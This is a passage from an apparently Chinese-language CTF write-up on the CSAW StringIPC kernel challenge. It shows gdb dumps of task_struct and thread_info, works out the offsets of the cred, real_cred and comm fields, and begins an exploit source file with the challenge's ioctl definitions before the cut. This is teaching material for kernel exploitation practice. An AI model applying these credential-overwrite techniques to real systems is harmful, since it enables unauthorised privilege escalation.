&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, &#123;</span><br><span class="line">        &#123;</span><br><span class="line">          &#123;</span><br><span class="line">            a = <span class="number">0x0</span>, </span><br><span class="line">            b = <span class="number">0x0</span></span><br><span class="line">          &#125;, </span><br><span class="line">          &#123;</span><br><span class="line">            limit0 = <span class="number">0x0</span>, </span><br><span class="line">            base0 = <span class="number">0x0</span>, </span><br><span class="line">            base1 = <span class="number">0x0</span>, </span><br><span class="line">            type = <span class="number">0x0</span>, </span><br><span class="line">            s = <span class="number">0x0</span>, </span><br><span class="line">            dpl = <span class="number">0x0</span>, </span><br><span class="line">            p = <span class="number">0x0</span>, </span><br><span class="line">            limit = <span class="number">0x0</span>, </span><br><span class="line">            avl = <span class="number">0x0</span>, </span><br><span class="line">            l = <span class="number">0x0</span>, </span><br><span class="line">            d = <span class="number">0x0</span>, </span><br><span class="line">            g = <span class="number">0x0</span>, </span><br><span class="line">            base2 = <span class="number">0x0</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;&#125;, </span><br><span class="line">    sp0 = <span class="number">0xffff88000f5f8000</span>, </span><br><span class="line">    sp = <span class="number">0xffff88000f5f7e98</span>, </span><br><span class="line">    es = <span class="number">0x0</span>, </span><br><span class="line">    ds = <span class="number">0x0</span>, </span><br><span class="line">    fsindex = <span class="number">0x63</span>, </span><br><span class="line">    gsindex = <span class="number">0x0</span>, </span><br><span class="line">    fs = <span class="number">0x0</span>, </span><br><span class="line">    gs = <span class="number">0x0</span>, </span><br><span class="line">    ptrace_bps = &#123;<span class="number">0x0</span> &lt;irq_stack_union&gt;, <span class="number">0x0</span> &lt;irq_stack_union&gt;, <span class="number">0x0</span> &lt;irq_stack_union&gt;, <span class="number">0x0</span> &lt;irq_stack_union&gt;&#125;, </span><br><span class="line">    debugreg6 = <span class="number">0x0</span>, </span><br><span class="line">    ptrace_dr7 = <span class="number">0x0</span>, </span><br><span class="line">    cr2 = <span class="number">0x0</span>, </span><br><span class="line">    trap_nr = <span class="number">0x0</span>, </span><br><span class="line">    error_code = <span class="number">0x0</span>, </span><br><span class="line">    io_bitmap_ptr = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">    iopl = <span class="number">0x0</span>, </span><br><span class="line">    io_bitmap_max = <span class="number">0x0</span>, </span><br><span class="line">    fpu = &#123;</span><br><span class="line">      last_cpu = <span class="number">0x0</span>, </span><br><span class="line">      fpstate_active = <span class="number">0x1</span>, </span><br><span class="line">      fpregs_active = <span class="number">0x1</span>, </span><br><span class="line">      counter = <span class="number">0x6</span>, </span><br><span class="line">      state = &#123;</span><br><span class="line">        fsave = &#123;</span><br><span class="line">          cwd = <span class="number">0x37f</span>, </span><br><span class="line">          swd = <span class="number">0x0</span>, </span><br><span class="line">          twd = <span class="number">0x0</span>, </span><br><span class="line">          fip = <span class="number">0x0</span>, </span><br><span class="line">          fcs = <span class="number">0x0</span>, </span><br><span class="line">          foo = <span class="number">0x0</span>, </span><br><span class="line">          fos = <span class="number">0x1f80</span>, </span><br><span class="line">          st_space = &#123;<span class="number">0xffff</span>, <span class="number">0x0</span> &lt;repeats <span class="number">19</span> times&gt;&#125;, </span><br><span class="line">          status = <span class="number">0x0</span></span><br><span class="line">        &#125;, </span><br><span class="line">        fxsave = &#123;</span><br><span class="line">          cwd = <span class="number">0x37f</span>, </span><br><span class="line">          swd = <span class="number">0x0</span>, </span><br><span class="line">          twd = <span class="number">0x0</span>, </span><br><span class="line">          fop = <span class="number">0x0</span>, </span><br><span class="line">          &#123;</span><br><span class="line">            &#123;</span><br><span class="line">              rip = <span class="number">0x0</span>, </span><br><span class="line">              rdp = <span class="number">0x0</span></span><br><span class="line">            &#125;, </span><br><span class="line">            &#123;</span><br><span class="line">              fip = <span class="number">0x0</span>, </span><br><span class="line">              fcs = <span class="number">0x0</span>, </span><br><span class="line">              foo = <span class="number">0x0</span>, </span><br><span class="line">              fos = <span class="number">0x0</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;, </span><br><span class="line">          mxcsr = <span class="number">0x1f80</span>, </span><br><span class="line">          mxcsr_mask = <span class="number">0xffff</span>, </span><br><span class="line">          st_space = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">32</span> times&gt;&#125;, </span><br><span class="line">          xmm_space = &#123;<span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x74747474</span>, <span class="number">0x74747474</span>, <span class="number">0x74747474</span>, <span class="number">0x74747474</span>, <span class="number">0x0</span> &lt;repeats <span class="number">13</span> times&gt;, <span class="number">0xff000000</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0xff0000</span>, </span><br><span class="line">            <span class="number">0x0</span> &lt;repeats <span class="number">36</span> times&gt;&#125;, </span><br><span class="line">          padding = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">12</span> times&gt;&#125;, </span><br><span class="line">          &#123;</span><br><span class="line">            padding1 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">12</span> times&gt;&#125;, </span><br><span class="line">            sw_reserved = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">12</span> times&gt;&#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, </span><br><span class="line">        soft = &#123;</span><br><span class="line">          cwd = <span class="number">0x37f</span>, </span><br><span class="line">          swd = <span class="number">0x0</span>, </span><br><span class="line">          twd = <span class="number">0x0</span>, </span><br><span class="line">          fip = <span class="number">0x0</span>, </span><br><span class="line">          fcs = <span class="number">0x0</span>, </span><br><span class="line">          foo = <span class="number">0x0</span>, </span><br><span class="line">          fos = <span class="number">0x1f80</span>, </span><br><span class="line">          st_space = &#123;<span class="number">0xffff</span>, <span class="number">0x0</span> &lt;repeats <span class="number">19</span> times&gt;&#125;, </span><br><span class="line">          ftop = <span class="number">0x0</span>, </span><br><span class="line">          changed = <span class="number">0x0</span>, </span><br><span class="line">          lookahead = <span class="number">0x0</span>, </span><br><span class="line">          no_update = <span class="number">0x0</span>, </span><br><span class="line">          rm = <span class="number">0x0</span>, </span><br><span class="line">          alimit = <span class="number">0x0</span>, </span><br><span class="line">          info = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">          entry_eip = <span class="number">0x0</span></span><br><span class="line">        &#125;, </span><br><span class="line">        xsave = &#123;</span><br><span class="line">          i387 = &#123;</span><br><span class="line">            cwd = <span class="number">0x37f</span>, </span><br><span class="line">            swd = <span class="number">0x0</span>, </span><br><span class="line">            twd = <span class="number">0x0</span>, </span><br><span class="line">            fop = <span class="number">0x0</span>, </span><br><span class="line">            &#123;</span><br><span class="line">              &#123;</span><br><span class="line">                rip = <span class="number">0x0</span>, </span><br><span class="line">                rdp = <span class="number">0x0</span></span><br><span class="line">              &#125;, </span><br><span class="line">              &#123;</span><br><span class="line">                fip = <span class="number">0x0</span>, </span><br><span class="line">                fcs = <span class="number">0x0</span>, </span><br><span class="line">                foo = <span class="number">0x0</span>, </span><br><span class="line">                fos = <span class="number">0x0</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;, </span><br><span class="line">            mxcsr = <span class="number">0x1f80</span>, </span><br><span class="line">            mxcsr_mask = <span class="number">0xffff</span>, </span><br><span class="line">            st_space = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">32</span> times&gt;&#125;, </span><br><span class="line">            xmm_space = &#123;<span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x74747474</span>, <span class="number">0x74747474</span>, <span class="number">0x74747474</span>, <span class="number">0x74747474</span>, <span class="number">0x0</span> &lt;repeats <span class="number">13</span> times&gt;, <span class="number">0xff000000</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0xff0000</span>, </span><br><span class="line">              <span class="number">0x0</span> &lt;repeats <span class="number">36</span> times&gt;&#125;, </span><br><span class="line">            padding = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">12</span> times&gt;&#125;, </span><br><span class="line">            &#123;</span><br><span class="line">              padding1 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">12</span> times&gt;&#125;, </span><br><span class="line">              sw_reserved = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">12</span> times&gt;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;, </span><br><span class="line">          header = &#123;</span><br><span class="line">            xfeatures = <span class="number">0x1</span>, </span><br><span class="line">            xcomp_bv = <span class="number">0xffff88000fabc000</span>, </span><br><span class="line">            reserved = &#123;<span class="number">0x40410000000002</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2700000000</span>, <span class="number">0xfffee570</span>, <span class="number">0xffff88000d700000</span>&#125;</span><br><span class="line">          &#125;, </span><br><span class="line">          extended_state_area = <span class="number">0xffff88000f843e80</span> <span class="string">""</span></span><br><span class="line">        &#125;, </span><br><span class="line">        __padding = "\177\003", '\000' &lt;repeats 22 times&gt;, "\200\037\000\000\377\377", '\000' &lt;repeats 130 times&gt;, "\377", '\000' &lt;repeats 15 times&gt;, 't' &lt;repeats 16 times&gt;, '\000' &lt;repeats 55 times&gt;...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>找到了<code>real_cred</code>，<code>cred</code>和<code>comm</code>相对于<code>task_struct</code>结构体开头的偏移。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">task_struct_begin = <span class="number">0xffff88000f842980</span></span><br><span class="line">stack_ptr_addr    = <span class="number">0xffff88000f842988</span>  offset = <span class="number">0x8</span></span><br><span class="line">real_cred_addr    = <span class="number">0xffff88000f843318</span>  offset = <span class="number">0x998</span></span><br><span class="line">cred_addr         = <span class="number">0xffff88000f843320</span>  offset = <span class="number">0x9a0</span></span><br><span class="line">comm              = <span class="number">0xffff88000f843328</span>  offset = <span class="number">0x9a8</span></span><br></pre></td></tr></table></figure>
<p>我们还可以看到<code>stack</code>指针值为<code>0xffff88000f5f4000</code>。<code>stack</code>指针指向<code>thread_union</code>结构体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> thread_union</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>  *<span class="title">task</span>;</span>      <span class="comment">/* main task structure */</span></span><br><span class="line">    __u32           flags;      <span class="comment">/* low level flags */</span></span><br><span class="line">    __u32           status;     <span class="comment">/* thread synchronous flags */</span></span><br><span class="line">    __u32           cpu;        <span class="comment">/* current CPU */</span></span><br><span class="line">    <span class="keyword">mm_segment_t</span>        addr_limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        sig_on_uaccess_error:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        uaccess_err:<span class="number">1</span>;  <span class="comment">/* uaccess failed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中<code>thread_info</code>是一个大小为<code>0x28</code>的结构体。其之后进程的内核栈。</p>
<p><code>在内核的某个特定组建使用了较多的栈空间时, 内核栈会溢出到thread_info部分, 因此内核提供了kstack_end函数来判断给出的地址是否位于栈的有效部分</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __HAVE_ARCH_KSTACK_END</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">kstack_end</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Reliable end of stack detection:</span></span><br><span class="line"><span class="comment">     * Some APM bios versions misalign the stack</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> !(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr+<span class="keyword">sizeof</span>(<span class="keyword">void</span>*)<span class="number">-1</span>) &amp; (THREAD_SIZE-<span class="keyword">sizeof</span>(<span class="keyword">void</span>*)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>进程的创建：<a href="https://blog.csdn.net/gatieme/article/details/51569932" target="_blank" rel="noopener">https://blog.csdn.net/gatieme/article/details/51569932</a></p>
<p>我们用<code>_do_fork</code>创建进程的时候, 提到<code>dup_task_struct</code>会复制父进程的<code>task_struct</code>和<code>thread_info</code>实例的内容, 但是<code>stack</code>则与新的<code>thread_info</code>实例位于同一个内存, 这意味着父子进程的<code>task_struct</code>此时除了栈指针之外完全相同。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">100</span>xg <span class="number">0xffff88000f5f4000</span></span><br><span class="line"><span class="number">0xffff88000f5f4000</span>:	<span class="number">0xffff88000f842980</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffff88000f5f4010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffffffff000</span></span><br><span class="line"><span class="number">0xffff88000f5f4020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000057ac6e9d</span></span><br><span class="line"><span class="number">0xffff88000f5f4030</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4040</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4050</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4060</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4070</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4080</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4090</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f40a0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f40b0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f40c0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f40d0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f40e0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f40f0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4100</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4110</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4120</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4130</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4140</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4150</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4160</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4170</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4180</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4190</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f41a0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f41b0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f41c0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f41d0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f41e0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f41f0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4200</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4210</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4220</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4230</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4240</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4250</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4260</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4270</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4280</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4290</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f42a0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f42b0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f42c0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f42d0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f42e0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f42f0</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4300</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">0xffff88000f5f4310</span>:	<span class="number">0xcccccccccccccccc</span>	<span class="number">0xcccccccccccccccc</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">gdb-peda$ p $rsp</span><br><span class="line">$<span class="number">8</span> = (<span class="keyword">void</span> *) <span class="number">0xffff88000f5f7f50</span></span><br><span class="line">    </span><br><span class="line">gdb-peda$ p (struct thread_info)*<span class="number">0xffff88000f5f4000</span></span><br><span class="line">$<span class="number">7</span> = &#123;</span><br><span class="line">  task = <span class="number">0xffff88000f842980</span>, </span><br><span class="line">  flags = <span class="number">0x0</span>, </span><br><span class="line">  status = <span class="number">0x0</span>, </span><br><span class="line">  cpu = <span class="number">0x0</span>, </span><br><span class="line">  addr_limit = &#123;</span><br><span class="line">    seg = <span class="number">0x7ffffffff000</span></span><br><span class="line">  &#125;, </span><br><span class="line">  sig_on_uaccess_error = <span class="number">0x0</span>, </span><br><span class="line">  uaccess_err = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://github.com/gatieme/LDD-LinuxDeviceDrivers/blob/master/study/kernel/01-process/02-create/06-thread_info/README.md" target="_blank" rel="noopener">https://github.com/gatieme/LDD-LinuxDeviceDrivers/blob/master/study/kernel/01-process/02-create/06-thread_info/README.md</a></p>
<h2 id="exp：-4"><a href="#exp：-4" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span 